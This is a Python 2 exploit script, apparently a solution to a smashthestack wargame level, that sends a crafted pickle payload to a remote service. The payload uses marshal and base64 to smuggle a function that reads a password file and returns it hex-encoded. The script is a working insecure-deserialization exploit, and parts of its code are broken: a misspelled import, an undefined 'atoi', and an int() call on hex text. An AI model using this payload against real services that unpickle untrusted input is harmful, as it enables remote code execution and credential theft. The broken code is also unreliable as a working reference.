#!/usr/bin/env python2

import socket
import sys

try:
    import cPickle as pickle
except:
    import picle

import marshal
import base64


class Connection:

    def __init__(self, host='127.0.0.1', port=54321, sock=None):
        self._host = host
        self._port = port
        if sock is None:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            self._sock = sock
        self._connect()

    def _connect(self):
        self._sock.connect((self._host, self._port))

    def send(self, msg):
        totalsent = 0
        while totalsent < len(msg):
            sent = self._sock.send(msg[totalsent:])
            if sent == 0:
                print "--- Connection broken, reconnecting..."
                self._connect()
            totalsent = totalsent + sent

    def recv(self):
        msg = []
        while True:
            data = self._sock.recv(1024)
            if not data:
                break
            msg.append(data)
        return ''.join(msg)

def toStr(s):
    return s and chr(atoi(s[:2], base=16)) + toStr(s[2:]) or ''

def run(test=True):

    if test:
        def foo():
            import string
            pwd = open('password', 'rb').read()
            pwd = string.replace(pwd, '\n', '')
            pwd = pwd.encode('hex')
            return [int(pwd)]

        conn = Connection()
    else:
        def foo():
            import string
            pwd = open('/home/level0/password', 'rb').read()
            pwd = string.replace(pwd, '\n', '')
            pwd = pwd.encode('hex')
            return [int(pwd)]
        conn = Connection(host='amateria.smashthestack.org')

    exploit = """ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'%s'
tRtRc__builtin__
globals
(tRS''
tR(tR.""" % base64.b64encode(marshal.dumps(foo.func_code))

    conn.send(exploit)

    answer = conn.recv()
    lines = answer.split('\n')
    #print lines[0]
    try:
        print lines[1].decode('hex')
    except:
        print lines[1]
    #print lines[2]

run(test=False)


